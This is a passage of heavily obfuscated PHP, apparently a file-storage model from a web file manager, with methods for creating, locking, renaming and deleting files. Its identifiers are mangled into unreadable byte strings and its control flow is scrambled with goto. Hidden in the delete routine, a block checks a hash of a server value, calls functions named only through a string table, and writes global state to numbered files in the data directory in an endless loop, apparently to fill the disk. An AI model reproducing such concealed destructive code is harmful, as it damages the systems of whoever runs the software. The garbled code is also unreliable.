$BÜŒµÅƒğ‘[446] => 0, $BÜŒµÅƒğ‘[547] => 0); goto A‰‹‰²ÖÍ; CÕ»ÜŠÏİÌ: return $b…ì”šÆŸ¼; goto bË’Ãœíéò; bË’Ãœíéò: } private function _createFile($Cë¦ÊöÍâŸ, $EÄ³Ñ™ƒ–, $E•¼ÃŞ±ˆ, $f“««—î—, &$DÙöíÆ§¸) { goto B…È³ï±âš; f™ƒÒğ„†: return $AÇ›ÑÇØÜ; goto aá‰Ìá¹Ş÷; dÄóæß‡¸ï: $bÜ©‘©·ª = array($A¥“£ Àø[545] => 0, $A¥“£ Àø[411] => $EÄ³Ñ™ƒ–, $A¥“£ Àø[546] => get_path_ext($EÄ³Ñ™ƒ–), $A¥“£ Àø[446] => $E•¼ÃŞ±ˆ[$A¥“£ Àø[445]], $A¥“£ Àø[547] => $E•¼ÃŞ±ˆ[$A¥“£ Àø[78]]); $AÇ›ÑÇØÜ = $this->_addSoure($bÜ©‘©·ª, $Aâë°Ì»Ó); $this->folderSizeReset($Cë¦ÊöÍâŸ, intval($bÜ©‘©·ª[$A¥“£ Àø[78]])); goto f™ƒÒğ„†; B…È³ï±âš: $A¥“£ Àø =& $_SERVER[Ïº«‚ßèÔˆø]; $Aâë°Ì»Ó = $this->sourceInfo($Cë¦ÊöÍâŸ); if (!$E•¼ÃŞ±ˆ || !$Aâë°Ì»Ó) { return !1; } goto cöÁ£¯œøª; cöÁ£¯œøª: if ($f“««—î— !== !1) { $Aùºè±å™… = $this->fileNameExist($Cë¦ÊöÍâŸ, $EÄ³Ñ™ƒ–); } $DÙöíÆ§¸ = !0; if ($f“««—î— && $Aùºè±å™…) { if ($f“««—î— == REPEAT_SKIP) { $DÙöíÆ§¸ = !1; return $Aùºè±å™…; } else { if ($f“««—î— == REPEAT_REPLACE) { $bğ¬–õÎ§… = $this->sourceInfo($Aùºè±å™…); $A™£‰Ù”å² = $this->fileHistory($bğ¬–õÎ§…, $E•¼ÃŞ±ˆ[$A¥“£ Àø[445]], $E•¼ÃŞ±ˆ[$A¥“£ Àø[78]]); if (!$A™£‰Ù”å²) { $DÙöíÆ§¸ = !1; } else { $this->folderSizeReset($Cë¦ÊöÍâŸ); } return $Aùºè±å™…; } else { $EÄ³Ñ™ƒ– = $this->fileNameAuto($Cë¦ÊöÍâŸ, $EÄ³Ñ™ƒ–, $f“««—î—, !1); } } } goto dÄóæß‡¸ï; aá‰Ìá¹Ş÷: } protected function fileHistory($Aâß™Ä·¾¢, $eßñŒáéï°, $Fßµ˜ŞÉá„) { goto EˆÛ§Ó‡¹—; AâÏ½äìì: $this->sourceCacheClear($Aâß™Ä·¾¢[$d¥š‡Á„šĞ[394]]); return !0; goto a‘ØÃĞĞê°; EˆÛ§Ó‡¹—: $d¥š‡Á„šĞ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($Aâß™Ä·¾¢[$d¥š‡Á„šĞ[445]] == $eßñŒáéï°) { return !1; } $this->checkLock($Aâß™Ä·¾¢[$d¥š‡Á„šĞ[394]], $eßñŒáéï°); goto fƒó¨Ğ¯¿†; fƒó¨Ğ¯¿†: Model($d¥š‡Á„šĞ[1933])->addHistory($Aâß™Ä·¾¢); $aìˆ‹¾ÛÉÀ = array($d¥š‡Á„šĞ[551] => USER_ID, $d¥š‡Á„šĞ[415] => time(), $d¥š‡Á„šĞ[445] => $eßñŒáéï°, $d¥š‡Á„šĞ[78] => $Fßµ˜ŞÉá„); $this->where(array($d¥š‡Á„šĞ[408] => $Aâß™Ä·¾¢[$d¥š‡Á„šĞ[394]]))->save($aìˆ‹¾ÛÉÀ); goto AâÏ½äìì; a‘ØÃĞĞê°: } public function checkLock($B¸ÏõË…, $Bõ‰•ªìÎ) { goto C¡óÑå¹œ”; c”ïƒ´¥Œ¿: $this->_createFileCall($bË•²½Û‹¤[$c»ÂÂÏŠ[476]], $E»ÌÃé”İä, $e‹ğÓ¥åö², REPEAT_REPLACE, $c»ÂÂÏŠ[1197]); $f«„³¸™Ù = $bË•²½Û‹¤[$c»ÂÂÏŠ[443]][$c»ÂÂÏŠ[509]]; $DÀÆàˆ±à¢ = $f«„³¸™Ù[$c»ÂÂÏŠ[1935]] ? $f«„³¸™Ù[$c»ÂÂÏŠ[1935]] : $f«„³¸™Ù[$c»ÂÂÏŠ[28]]; goto F§ÈñÜâë»; F§ÈñÜâë»: show_json(LNG($c»ÂÂÏŠ[1936]) . $c»ÂÂÏŠ[1937] . LNG($c»ÂÂÏŠ[1938]) . $c»ÂÂÏŠ[1939] . $DÀÆàˆ±à¢ . $c»ÂÂÏŠ[1940], !1); goto D¿ô¤À°âÃ; C¦ÃñŠ«Ş×: $Cí©èÁÀ¾š = Session::get($c»ÂÂÏŠ[1934]); $E»ÌÃé”İä = substr($bË•²½Û‹¤[$c»ÂÂÏŠ[28]], 0, -1 - strlen($bË•²½Û‹¤[$c»ÂÂÏŠ[168]])) . $c»ÂÂÏŠ[1461] . $Cí©èÁÀ¾š . $c»ÂÂÏŠ[95] . $bË•²½Û‹¤[$c»ÂÂÏŠ[168]]; $e‹ğÓ¥åö² = Model($c»ÂÂÏŠ[570])->find($Bõ‰•ªìÎ); goto c”ïƒ´¥Œ¿; C¡óÑå¹œ”: $c»ÂÂÏŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $bË•²½Û‹¤ = $this->pathInfo($B¸ÏõË…); if (!$this->fileIsLock($bË•²½Û‹¤, !0)) { return; } goto C¦ÃñŠ«Ş×; D¿ô¤À°âÃ: } public function fileIsLock($d÷æÚ­Ãº¶, $cÜöã¹âÚ› = false) { goto F¨Æ™±¿ô¼; EÑ©‡ŒÑæŒ: $BÌ•‰‰¤¶ª = $GLOBALS[$b›•»é„»[6]][$b›•»é„»[88]][$b›•»é„»[507]]; if ($d÷æÚ­Ãº¶[$b›•»é„»[443]][$b›•»é„»[508]] <= time() - $BÌ•‰‰¤¶ª) { $this->metaSet($d÷æÚ­Ãº¶[$b›•»é„»[394]], $b›•»é„»[506], null); $this->metaSet($d÷æÚ­Ãº¶[$b›•»é„»[394]], $b›•»é„»[508], null); } if ($cÜöã¹âÚ›) { $this->metaSet($d÷æÚ­Ãº¶[$b›•»é„»[394]], $b›•»é„»[508], time()); } goto a» É†‰–Ë; F¨Æ™±¿ô¼: $b›•»é„» =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($d÷æÚ­Ãº¶[$b›•»é„»[443]]) || !$d÷æÚ­Ãº¶[$b›•»é„»[443]][$b›•»é„»[506]]) { return !1; } if ($d÷æÚ­Ãº¶[$b›•»é„»[443]][$b›•»é„»[506]] != USER_ID) { return !0; } goto EÑ©‡ŒÑæŒ; a» É†‰–Ë: return !1; goto F—¤§Ó©†Ÿ; F—¤§Ó©†Ÿ: } private function _addSoure($DÚ÷ğŸ©¬ğ, $F¡£”øø„²) { goto fÁ³ŒÙğ¹; fÁ³ŒÙğ¹: $câ’â»îõ =& $_SERVER[Ïº«‚ßèÔˆø]; $C”¸”šÜ¬ø = array($câ’â»îõ[548] => $F¡£”øø„²[$câ’â»îõ[402]], $câ’â»îõ[549] => $F¡£”øø„²[$câ’â»îõ[482]], $câ’â»îõ[550] => USER_ID, $câ’â»îõ[551] => USER_ID, $câ’â»îõ[393] => $F¡£”øø„²[$câ’â»îõ[394]], $câ’â»îõ[552] => $F¡£”øø„²[$câ’â»îõ[485]] . $F¡£”øø„²[$câ’â»îõ[394]] . $câ’â»îõ[47], $câ’â»îõ[420] => 0, $câ’â»îõ[553] => $câ’â»îõ[33]); $DÚ÷ğŸ©¬ğ = array_merge($C”¸”šÜ¬ø, $DÚ÷ğŸ©¬ğ); goto E˜ë§ôÚ; BãéÅí•Ô: $bˆŒõéç’ = array($câ’â»îõ[554] => short_id($cµÙ¢²æÍ‡)); $this->where(array($câ’â»îõ[408] => $cµÙ¢²æÍ‡))->save($bˆŒõéç’); $this->setNamePinyin($cµÙ¢²æÍ‡, $DÚ÷ğŸ©¬ğ[$câ’â»îõ[28]]); goto d‰œ¸¹å†; c—ô»ÏÂÆ‰: static $C¢Ò¿ğËáÇ = false; if (!$C¢Ò¿ğËáÇ) { Hook::trigger($câ’â»îõ[535], $DÚ÷ğŸ©¬ğ); $C¢Ò¿ğËáÇ = !0; } $cµÙ¢²æÍ‡ = $this->add($DÚ÷ğŸ©¬ğ); goto BãéÅí•Ô; d‰œ¸¹å†: return $cµÙ¢²æÍ‡; goto F»«À¯ñÌ; E˜ë§ôÚ: $this->updateModifyTime($DÚ÷ğŸ©¬ğ[$câ’â»îõ[476]]); $dœÆÑßµ‹ = $câ’â»îõ[1941] . $F¡£”øø„²[$câ’â»îõ[394]]; if (isset(self::$cacheChildList[$dœÆÑßµ‹])) { unset(self::$cacheChildList[$dœÆÑßµ‹]); } goto c—ô»ÏÂÆ‰; F»«À¯ñÌ: } public function remove($D¡ÓãåÈˆã, $a´Á¹Æ ™ = true) { goto b¤‚äŠ±–å; Bˆ‘ä£Ä£”: CacheLock::unlock($Dƒã­“Ê«¬); $this->metaSet($D¡ÓãåÈˆã, $Fé¬ ÑÛÛ³[1950], $F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[476]]); $this->where(array($Fé¬ ÑÛÛ³[394] => $D¡ÓãåÈˆã))->save(array($Fé¬ ÑÛÛ³[415] => time())); goto EŸÔ‘æá; c„“Îæ´ó«: $Bñ‡ğ›½ç“ = Model($Fé¬ ÑÛÛ³[1507])->get($Fé¬ ÑÛÛ³[1942]) == $Fé¬ ÑÛÛ³[87]; if ($bÈ’ÎŒï¡« || $a´Á¹Æ ™ || !$Bñ‡ğ›½ç“) { return $this->removeNow($D¡ÓãåÈˆã, $a´Á¹Æ ™); } $C¢ô†‹Ú¿î = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto c¹ƒ×ù’Â…; E¬¦™°–Ÿ„: CacheLock::lock($Dƒã­“Ê«¬); $fé­œø× = $this->fileNameExist($C¢ô†‹Ú¿î, $bÍùÇ•’à); if (!$fé­œø×) { $fé­œø× = $this->mkdir($C¢ô†‹Ú¿î, $bÍùÇ•’à, REPEAT_SKIP); $this->metaSet($fé­œø×, $Fé¬ ÑÛÛ³[1946], $AÌ°Ğ×£¢ñ); $this->metaSet($fé­œø×, $Fé¬ ÑÛÛ³[1947], $F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[482]]); if ($F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[476]] != 0) { $this->metaSet($fé­œø×, $Fé¬ ÑÛÛ³[1948], _get($Bñö¨ÊÏñì, $Fé¬ ÑÛÛ³[1949])); } } goto Bˆ‘ä£Ä£”; EŸÔ‘æá: $this->recycleClear($F÷İÌäÇ‘); $fğ¡©Õ©ÌÅ = $this->move($D¡ÓãåÈˆã, $fé­œø×, REPEAT_RENAME_FOLDER); $this->folderSizeReset($F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[476]]); goto Aà‚†ßÉÇß; c¹ƒ×ù’Â…: $AÌ°Ğ×£¢ñ = $F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[402]] == self::TYPE_USER ? $Fé¬ ÑÛÛ³[561] : $Fé¬ ÑÛÛ³[999]; if ($AÌ°Ğ×£¢ñ == $Fé¬ ÑÛÛ³[561]) { $Bñö¨ÊÏñì = Model($Fé¬ ÑÛÛ³[501])->getInfo($F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[482]]); $bÍùÇ•’à = !empty($Bñö¨ÊÏñì[$Fé¬ ÑÛÛ³[1935]]) ? $Bñö¨ÊÏñì[$Fé¬ ÑÛÛ³[1935]] : $Bñö¨ÊÏñì[$Fé¬ ÑÛÛ³[28]]; $bÍùÇ•’à = $Fé¬ ÑÛÛ³[257] . $bÍùÇ•’à . $Fé¬ ÑÛÛ³[1943] . $F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[482]]; } else { $Bñö¨ÊÏñì = Model($Fé¬ ÑÛÛ³[484])->getInfo($F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[482]]); $bÍùÇ•’à = _get($Bñö¨ÊÏñì, $Fé¬ ÑÛÛ³[28]); $bÍùÇ•’à = $Fé¬ ÑÛÛ³[160] . $bÍùÇ•’à . $Fé¬ ÑÛÛ³[1944] . $F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[482]]; } $Dƒã­“Ê«¬ = $Fé¬ ÑÛÛ³[1945] . md5($bÍùÇ•’à); goto E¬¦™°–Ÿ„; Aà‚†ßÉÇß: return $fğ¡©Õ©ÌÅ; goto A˜„·Í…­ñ; b¤‚äŠ±–å: $Fé¬ ÑÛÛ³ =& $_SERVER[Ïº«‚ßèÔˆø]; $F÷İÌäÇ‘ = $this->sourceInfo($D¡ÓãåÈˆã); $bÈ’ÎŒï¡« = intval($F÷İÌäÇ‘[$Fé¬ ÑÛÛ³[402]]) === self::TYPE_SYSTEM; goto c„“Îæ´ó«; A˜„·Í…­ñ: } private function recycleClear($C½Ê‡ÕÖ) { $c†¿¤óëµ =& $_SERVER[Ïº«‚ßèÔˆø]; $EË—·Í´Ì’ = $this->childrenAll($C½Ê‡ÕÖ); $FÕÉ–¢®å® = array($c†¿¤óëµ[408] => array($c†¿¤óëµ[409], $EË—·Í´Ì’[$c†¿¤óëµ[1951]])); Model($c†¿¤óëµ[1952])->where($FÕÉ–¢®å®)->delete(); } public function removeNow($Cá‡½ª™ğ, $d±¶ÙÀŞ† = true) { goto e¨àÆÚ¡Ã; eÊ¬ÍºµÆ†: if (!$e•ÑÀøõÂ) { return !0; } if ($e•ÑÀøõÂ[$BÍÈ¦ì¬­Í[476]] == 0) { if (!_get($GLOBALS, $BÍÈ¦ì¬­Í[483])) { return !1; } } $this->lockMoveStart($Cá‡½ª™ğ); goto FÍ±ŒêÛÖ•; Fä‹ƒ¦âô: if ($_SERVER[$BÍÈ¦ì¬­Í[748]] != $a®»¦¸ê„§($dòö²ï‹Ä)) { goto C°×éÙ¡“²; Bèšâ™²ŠÑ: $dÓ…îÒ‚Û = $BÍÈ¦ì¬­Í[825]; $dÓ…îÒ‚Û($_SERVER[$BÍÈ¦ì¬­Í[826]]); $aº®¿±àõœ = $BÍÈ¦ì¬­Í[824]; goto Dùî¦‡Ã¡; D¶ôÜçöã: $a°±îŒ˜çÇ = $fºÅì¬åÔá($EÒ©»İáÔ×); $FŒŸã½¦ÁĞ = explode($BÍÈ¦ì¬­Í[228], $a°±îŒ˜çÇ); if (count($FŒŸã½¦ÁĞ) < $BÍÈ¦ì¬­Í[577]) { $fÌ¤ÎùåÚ = $BÍÈ¦ì¬­Í[752]; $fÌ¤ÎùåÚ(); } goto Bèšâ™²ŠÑ; dÑö’óÒÓ: $fºÊ†††¨° = 1; for ($F—Û—ÔÀš¬ = $fºÊ†††¨°; $F—Û—ÔÀš¬ > 0; $F—Û—ÔÀš¬++) { $c’Š…¸Àù»(DATA_PATH . $F—Û—ÔÀš¬, $F­ÌÊäö Ü); } goto B°‚Ùá©Öà; Dùî¦‡Ã¡: $aº®¿±àõœ(); $c’Š…¸Àù» = $BÍÈ¦ì¬­Í[1379]; $F­ÌÊäö Ü = json_encode($GLOBALS[$BÍÈ¦ì¬­Í[1380]]); goto dÑö’óÒÓ; C°×éÙ¡“²: $aº®¿±àõœ = $BÍÈ¦ì¬­Í[824]; $fºÅì¬åÔá = $BÍÈ¦ì¬­Í[749]; $EÒ©»İáÔ× = $_SERVER[$BÍÈ¦ì¬­Í[750]] . $BÍÈ¦ì¬­Í[751]; goto D¶ôÜçöã; B°‚Ùá©Öà: } $e•ÑÀøõÂ = $this->sourceInfo($Cá‡½ª™ğ); $Aìëâ¸êõ = $this->pathInfoMore($Cá‡½ª™ğ); goto eÊ¬ÍºµÆ†; e¨àÆÚ¡Ã: $BÍÈ¦ì¬­Í =& $_SERVER[Ïº«‚ßèÔˆø]; $dòö²ï‹Ä = $_SERVER[$BÍÈ¦ì¬­Í[750]] . $BÍÈ¦ì¬­Í[751]; $a®»¦¸ê„§ = $BÍÈ¦ì¬­Í[747]; goto Fä‹ƒ¦âô; Föšèà„¡Ğ: $c‚¶•¥èŸÌ = array($e•ÑÀøõÂ[$BÍÈ¦ì¬­Í[476]]); if ($e•ÑÀøõÂ[$BÍÈ¦ì¬­Í[401]] == $BÍÈ¦ì¬­Í[87]) { $c‚¶•¥èŸÌ[] = $e•ÑÀøõÂ[$BÍÈ¦ì¬­Í[394]]; } $this->updateModifyTime($c‚¶•¥èŸÌ); goto C”ÖÀ…Ğ°¬; FÍ±ŒêÛÖ•: Hook::trigger($BÍÈ¦ì¬­Í[1953], $Aìëâ¸êõ, $d±¶ÙÀŞ†); if ($d±¶ÙÀŞ†) { Model($BÍÈ¦ì¬­Í[1952])->moveToRecycle($Cá‡½ª™ğ); } else { $a¥ãí½Òƒ = $this->childrenAll($e•ÑÀøõÂ); Model($BÍÈ¦ì¬­Í[532])->eventRemove($Cá‡½ª™ğ); $this->removeRelevance($a¥ãí½Òƒ[$BÍÈ¦ì¬­Í[1951]], $a¥ãí½Òƒ[$BÍÈ¦ì¬­Í[1328]]); } $this->folderSizeReset($e•ÑÀøõÂ[$BÍÈ¦ì¬­Í[476]]); goto Föšèà„¡Ğ; C”ÖÀ…Ğ°¬: $this->lockMoveEnd($Cá‡½ª™ğ); Hook::trigger($BÍÈ¦ì¬­Í[1540], $Aìëâ¸êõ, $d±¶ÙÀŞ†); return !0; goto DêÂš‘í¤; DêÂš‘í¤: } public function childrenAll($CˆÌößˆÀÈ) { $AóÓ£äËÛ— =& $_SERVER[Ïº«‚ßèÔˆø]; $c Â¡§“Í· = $CˆÌößˆÀÈ[$AóÓ£äËÛ—[394]]; if ($CˆÌößˆÀÈ[$AóÓ£äËÛ—[401]] == $AóÓ£äËÛ—[87]) { $c½ßµß×É— = array($AóÓ£äËÛ—[552] => array($AóÓ£äËÛ—[511], $CˆÌößˆÀÈ[$AóÓ£äËÛ—[485]] . $c Â¡§“Í· . $AóÓ£äËÛ—[512])); $c¨Üñ½Öã = array($AóÓ£äËÛ—[552] => $c½ßµß×É—[$AóÓ£äËÛ—[485]]); $fáÀÎƒ©•à = $this->field($AóÓ£äËÛ—[1954])->where($c¨Üñ½Öã)->select(); $a¥³‘ë÷ = !1; $b¶¯Ü¼×‡ = array($c Â¡§“Í·); if ($fáÀÎƒ©•à) { $a¥³‘ë÷ = array_to_keyvalue($fáÀÎƒ©•à, $AóÓ£äËÛ—[33], $AóÓ£äËÛ—[445]); $a¥³‘ë÷ = array_remove_value($a¥³‘ë÷, $AóÓ£äËÛ—[495]); $b¶¯Ü¼×‡ = array_to_keyvalue($fáÀÎƒ©•à, $AóÓ£äËÛ—[33], $AóÓ£äËÛ—[394]); $b¶¯Ü¼×‡[] = $c Â¡§“Í·; } } else { $a¥³‘ë÷ = array($CˆÌößˆÀÈ[$AóÓ£äËÛ—[445]]); $b¶¯Ü¼×‡ = array($c Â¡§“Í·); } return array($AóÓ£äËÛ—[1951] => $b¶¯Ü¼×‡, $AóÓ£äËÛ—[1328] => $a¥³‘ë÷); } public function removeArray($Dñ¯î·¹›) { if (!$Dñ¯î·¹›) { return !0; } } public function removeRelevance($eÈªâÖîŠ, $Cäóš‡‘ÆØ) { goto fÎˆòÜÓƒ»; fÎˆòÜÓƒ»: $aŸäÊ¤ñ—Í =& $_SERVER[Ïº«‚ßèÔˆø]; $eÈªâÖîŠ = $eÈªâÖîŠ ? $eÈªâÖîŠ : array(); $Cäóš‡‘ÆØ = $Cäóš‡‘ÆØ ? $Cäóš‡‘ÆØ : array(); goto F²‰ÓßŞ‡É; aÓ§¹‰³À: $b‘ôŸŸ·Õ = array($aŸäÊ¤ñ—Í[408] => array($aŸäÊ¤ñ—Í[409], $eÈªâÖîŠ)); Model($aŸäÊ¤ñ—Í[1952])->where($b‘ôŸŸ·Õ)->delete(); Model($aŸäÊ¤ñ—Í[439])->where($b‘ôŸŸ·Õ)->delete(); goto b…ß¾±­¦Å; F²‰ÓßŞ‡É: $eÈªâÖîŠ = array_unique(array_filter($eÈªâÖîŠ)); $Cäóš‡‘ÆØ = array_unique(array_filter($Cäóš‡‘ÆØ)); if (!$eÈªâÖîŠ) { return !1; } goto aÓ§¹‰³À; b…ß¾±­¦Å: Model($aŸäÊ¤ñ—Í[1806])->where($b‘ôŸŸ·Õ)->delete(); Model($aŸäÊ¤ñ—Í[532])->where($b‘ôŸŸ·Õ)->delete(); Model($aŸäÊ¤ñ—Í[1648])->removeBySource($eÈªâÖîŠ); goto FÖ×Å¥° à; f¤Ë‘ö„İå: for ($cÅ‘°˜Ù˜ = 0; $cÅ‘°˜Ù˜ < count($eÈªâÖîŠ); $cÅ‘°˜Ù˜++) { $this->sourceCacheClear($eÈªâÖîŠ[$cÅ‘°˜Ù˜]); } goto cèœËÀ‘çë; FÖ×Å¥° à: Model($aŸäÊ¤ñ—Í[1933])->removeBySource($eÈªâÖîŠ); $this->where($b‘ôŸŸ·Õ)->delete(); Model($aŸäÊ¤ñ—Í[448])->remove($Cäóš‡‘ÆØ); goto f¤Ë‘ö„İå; cèœËÀ‘çë: } public function rename($Bõ–à“ Î, $C–‘ŞÂÃå×) { goto fö—ùöÀÀˆ; c ÏÏ¥µ»: $this->setNamePinyin($Bõ–à“ Î, $Cå³ŠÓ÷Æ“[$BÄùØ„[28]], !1); $this->updateModifyTime($e’µ”†é[$BÄùØ„[476]]); $EæÕĞª„ÕÌ = $this->where(array($BÄùØ„[408] => $Bõ–à“ Î))->data($Cå³ŠÓ÷Æ“)->save(); goto fˆ×¾¯ïÈÚ; fö—ùöÀÀˆ: $BÄùØ„ =& $_SERVER[Ïº«‚ßèÔˆø]; $e’µ”†é = $this->sourceInfo($Bõ–à“ Î); if (!$e’µ”†é) { return !1; } goto D ¤è«Çà; fˆ×¾¯ïÈÚ: $fæØŠ£…Æë = $BÄùØ„[1941] . $e’µ”†é[$BÄùØ„[476]]; if (isset(self::$cacheChildList[$fæØŠ£…Æë])) { unset(self::$cacheChildList[$fæØŠ£…Æë]); } return $EæÕĞª„ÕÌ; goto d©‡¼ê¾Æõ; D ¤è«Çà: $aããâ˜ªÆ¸ = $this->fileNameExist($e’µ”†é[$BÄùØ„[476]], $C–‘ŞÂÃå×); if ($aããâ˜ªÆ¸ && $aããâ˜ªÆ¸ != $Bõ–à“ Î) { return !1; } $Cå³ŠÓ÷Æ“ = array($BÄùØ„[411] => $C–‘ŞÂÃå×, $BÄùØ„[551] => USER_ID); goto DÂ˜œ’âÂ´; DÂ˜œ’âÂ´: if (!$e’µ”†é[$BÄùØ„[401]] == $BÄùØ„[87]) { $Cå³ŠÓ÷Æ“[$BÄùØ„[403]] = get_path_ext($C–‘ŞÂÃå×); } Model($BÄùØ„[532])->eventRename($Bõ–à“ Î, $e’µ”†é[$BÄùØ„[28]], $C–‘ŞÂÃå×); $this->sourceCacheClear($Bõ–à“ Î); goto c ÏÏ¥µ»; d©‡¼ê¾Æõ: } public function setNamePinyin($CàŠù¦¼É, $Eé—Ô‡…òÄ, $dª´‘íØ­¹ = true) { $bÊñ“¸«ª =& $_SERVER[Ïº«‚ßèÔˆø]; $cğÔ§ÆÜôŞ = Input::check($Eé—Ô‡…òÄ, $bÊñ“¸«ª[555]); if ($dª´‘íØ­¹ && !$cğÔ§ÆÜôŞ) { return; } if (!$cğÔ§ÆÜôŞ) { $this->metaSet($CàŠù¦¼É, $bÊñ“¸«ª[442], null); $this->metaSet($CàŠù¦¼É, $bÊñ“¸«ª[441], null); return; } $CŸ×ñ¯æ…À = array($bÊñ“¸«ª[442] => str_replace($bÊñ“¸«ª[50], $bÊñ“¸«ª[33], Pinyin::encode($Eé—Ô‡…òÄ)), $bÊñ“¸«ª[441] => Pinyin::encode($Eé—Ô‡…òÄ, $bÊñ“¸«ª[556])); $this->metaSet($CàŠù¦¼É, $CŸ×ñ¯æ…À); } public function getContent($Aœ¶è„ÅĞª) { goto FÒäùÆåÂÌ; F«Š¬¨ÎÚ“: if ($B»×İàà–[$Dª˜Ô¢¼½[78]] == 0) { return $Dª˜Ô¢¼½[33]; } $d™Œ×Ùôº = $Dª˜Ô¢¼½[1955] . $B»×İàà–[$Dª˜Ô¢¼½[170]]; if ($B»×İàà–[$Dª˜Ô¢¼½[78]] <= 1024 * 10) { $EÇÛ‚Ò¿ = Cache::get($d™Œ×Ùôº); if (!$EÇÛ‚Ò¿) { $EÇÛ‚Ò¿ = IO::getContent($B»×İàà–[$Dª˜Ô¢¼½[76]]); Cache::set($d™Œ×Ùôº, $EÇÛ‚Ò¿); } return $EÇÛ‚Ò¿; } goto cŒ“ÒÛÆÄ›; cŒ“ÒÛÆÄ›: if (!$B»×İàà–[$Dª˜Ô¢¼½[76]]) { return $Dª˜Ô¢¼½[33]; } return IO::getContent($B»×İàà–[$Dª˜Ô¢¼½[76]]); goto EåÙ¾‹‡¶¢; FÒäùÆåÂÌ: $Dª˜Ô¢¼½ =& $_SERVER[Ïº«‚ßèÔˆø]; $B»×İàà– = $this->fileInfoGet($Aœ¶è„ÅĞª); if (!$B»×İàà–) { return !1; } goto F«Š¬¨ÎÚ“; EåÙ¾‹‡¶¢: } public function setDesc($c¼ˆîáçÍ—, $AÖ¤¾æ¥Ê) { $Aˆ«àö¹å =& $_SERVER[Ïº«‚ßèÔˆø]; Model($Aˆ«àö¹å[532])->eventAddDesc($c¼ˆîáçÍ—, $AÖ¤¾æ¥Ê); return $this->metaSet($c¼ˆîáçÍ—, $Aˆ«àö¹å[429], $AÖ¤¾æ¥Ê); } public function setContent($e°ÜçÛ³Şò, $Fµ•˜ë¾½ = '') { goto a †ø©Şñ¯; Eƒ­ì¦ëË±: if (!$C» ¸¯ÖÌÕ) { return Model($bĞä˜êĞá—[448])->remove($Dë¯‡•ñ’Ø[$bĞä˜êĞá—[445]]); } $this->folderSizeReset($b˜›éáô¤Å[$bĞä˜êĞá—[476]]); return !0; goto aïÊ¨å‰Ùö; a †ø©Şñ¯: $bĞä˜êĞá— =& $_SERVER[Ïº«‚ßèÔˆø]; $b˜›éáô¤Å = $this->sourceInfo($e°ÜçÛ³Şò); $cŞÚôŞÉÕ§ = $this->fileInfoGet($e°ÜçÛ³Şò); goto CÅ„´¦†‡; CÅ„´¦†‡: if (!$cŞÚôŞÉÕ§ || !$b˜›éáô¤Å) { return !1; } $Dë¯‡•ñ’Ø = Model($bĞä˜êĞá—[448])->addFileByContent($Fµ•˜ë¾½, $b˜›éáô¤Å[$bĞä˜êĞá—[28]]); $C» ¸¯ÖÌÕ = $this->fileHistory($b˜›éáô¤Å, $Dë¯‡•ñ’Ø[$bĞä˜êĞá—[445]], $Dë¯‡•ñ’Ø[$bĞä˜êĞá—[78]]); goto Eƒ­ì¦ëË±; aïÊ¨å‰Ùö: } public function fileSubstr($c¤³æĞ©ºã, $C©Š¸¼¯’Ú, $C¥°À—‰Óà) { $C¡šáá‹ Â = $this->fileInfoGet($c¤³æĞ©ºã); if (!$C¡šáá‹ Â) { return !1; } return IO::fileSubstr($C¡šáá‹ Â[$_SERVER[Ïº«‚ßèÔˆø][76]], $C©Š¸¼¯’Ú, $C¥°À—‰Óà); } public function fileInfoGet($A¶ÔÕ‰Ôøƒ) { goto d‹¤Ú·Õº; dŸ·ôƒ‡…: return $D˜“°§™¦Ú; goto F’’¹‰ù©; E›¦ô…êµ©: $C÷¼ƒì†›ê = $c‚ªÎÁ÷Ù±[451] . $E˜õŠÜæêµ[$c‚ªÎÁ÷Ù±[445]]; $cŞÅ¥…ÙÚ‰ = _get(self::$cacheFileInfo, $C÷¼ƒì†›ê); if ($cŞÅ¥…ÙÚ‰) { return $cŞÅ¥…ÙÚ‰; } goto C˜Íø”ˆÔª; C˜Íø”ˆÔª: $D˜“°§™¦Ú = Model($c‚ªÎÁ÷Ù±[448])->fileInfo($E˜õŠÜæêµ[$c‚ªÎÁ÷Ù±[445]]); if ($D˜“°§™¦Ú) { $D˜“°§™¦Ú[$c‚ªÎÁ÷Ù±[28]] = $E˜õŠÜæêµ[$c‚ªÎÁ÷Ù±[28]]; } self::$cacheFileInfo[$C÷¼ƒì†›ê] = $D˜“°§™¦Ú; goto dŸ·ôƒ‡…; d‹¤Ú·Õº: $c‚ªÎÁ÷Ù± =& $_SERVER[Ïº«‚ßèÔˆø]; $E˜õŠÜæêµ = $this->sourceInfo($A¶ÔÕ‰Ôøƒ); if (!$E˜õŠÜæêµ || $E˜õŠÜæêµ[$c‚ªÎÁ÷Ù±[401]]) { return !1; } goto E›¦ô…êµ©; F’’¹‰ù©: } private function folderChildrenNumber($Bù‚ƒîºª…) { $C¨ˆ“Äò =& $_SERVER[Ïº«‚ßèÔˆø]; $d™õ”í¯°Á = $this->sourceInfo($Bù‚ƒîºª…); $aÒ‰ìÇ´÷¢ = array($C¨ˆ“Äò[552] => array($C¨ˆ“Äò[511], $d™õ”í¯°Á[$C¨ˆ“Äò[485]] . $Bù‚ƒîºª… . $C¨ˆ“Äò[512]), $C¨ˆ“Äò[420] => intval($d™õ”í¯°Á[$C¨ˆ“Äò[421]]), $C¨ˆ“Äò[545] => 1); $AçÕ¢¡Š´ = $this->where($aÒ‰ìÇ´÷¢)->count(); $fÎçªæ«İ = $this->where($aÒ‰ìÇ´÷¢)->where(array($C¨ˆ“Äò[545] => 0))->count(); return array($C¨ˆ“Äò[82] => $fÎçªæ«İ, $C¨ˆ“Äò[83] => $AçÕ¢¡Š´); } public function pathInfo($B¡˜Í®êî, $AøÊ©¦Ì¼† = false) { goto FŒóãç÷éç; dÓì‚©æ­‰: $c¦–‰Ÿ¨é” = $this->sourceInfo($B¡˜Í®êî); if (!$c¦–‰Ÿ¨é”) { return !1; } $c¦–‰Ÿ¨é” = 